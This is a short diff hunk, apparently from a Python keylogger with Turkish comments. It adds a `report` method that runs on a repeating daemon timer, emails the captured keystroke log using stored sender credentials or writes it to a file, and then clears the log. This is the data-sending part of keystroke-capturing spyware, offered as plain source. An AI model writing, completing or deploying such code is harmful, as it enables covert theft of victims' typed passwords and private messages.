@@ -87,4 +87,27 @@ def callback(self, event):
         if verbose:
             print(f"{datetime.now()} - Sent an email to {email} containing:  {message}")
 
+    def report(self):
+        """
+        Bu islev her `self.interval`de cagirilir
+          Temel olarak keylog gonderir ve `self.log` degiskenini sifirlar
+        """
+        if self.log:
+            # gunlukte bir sey varsa, rapor edin
+            self.end_dt = datetime.now()
+            # `self.filename` guncellemesi
+            self.update_filename()
+            if self.report_method == "email":
+                self.sendmail(EMAIL_ADDRESS, EMAIL_PASSWORD, self.log)
+            elif self.report_method == "file":
+                self.report_to_file()
+            print(f"[{self.filename}] - {self.log}")
+            self.start_dt = datetime.now()
+        self.log = ""
+        timer = Timer(interval=self.interval, function=self.report)
+        # is parcacigini daemon olarak ayarlayin
+        timer.daemon = True
+        # zamanlayiciyi baslatin
+        timer.start()        
+
     
